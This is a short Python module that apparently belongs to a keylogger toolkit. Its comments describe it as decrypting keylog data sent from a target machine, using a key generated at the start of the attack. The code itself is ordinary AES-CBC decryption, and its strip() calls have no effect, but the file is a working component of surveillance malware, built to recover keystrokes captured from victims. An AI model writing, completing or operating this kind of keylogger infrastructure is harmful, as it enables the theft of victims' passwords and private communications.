from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from binascii import unhexlify

# This module contains a method which uses a couple of encryption/encoding libraries to decrypt keylog 
# data sent from the target using the key generated at the start of the attack and the iv appended 
# to the encrypted keylog data

def decrypt_data(cipher_text, aes_key, aes_iv):

    # Remove all possible anamoly characters in the working data

    cipher_text.strip()
    aes_key.strip()
    aes_iv.strip()

    # Switch from hex to the byte data which is what most encryption/decryption libraries work with

    byte_cipher = unhexlify(cipher_text)
    byte_key = unhexlify(aes_key)
    byte_iv = unhexlify(aes_iv)
    
    # Create a decryptor object

    aes_decryptor = AES.new(byte_key, AES.MODE_CBC, byte_iv)

    # Use the decryptor to retrieve and return the plain text data originally captured on the target machine

    plain_text = unpad(aes_decryptor.decrypt(byte_cipher), AES.block_size)
    
    return plain_text
   